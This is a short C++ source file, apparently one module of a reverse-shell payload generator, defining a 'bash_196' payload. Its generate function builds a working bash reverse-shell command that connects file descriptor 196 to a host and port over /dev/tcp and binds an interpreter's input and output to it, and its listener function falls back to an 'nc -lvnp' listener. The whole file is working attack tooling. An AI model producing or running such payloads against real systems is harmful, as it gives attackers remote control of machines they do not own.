#include "Bash_196_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string Bash196Payload:: name() const {
    return "bash_196";
}

std::string Bash196Payload::generate(const Options& opts) const {
    // Generate a Bash 196 reverse shell payload
    return "0<196;exec 196<>/dev/tcp/" + opts.host + "/" + std::to_string(opts.port) + "; " + opts.interpreter + " <&196 >&196 2>&196";
}

std::string Bash196Payload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}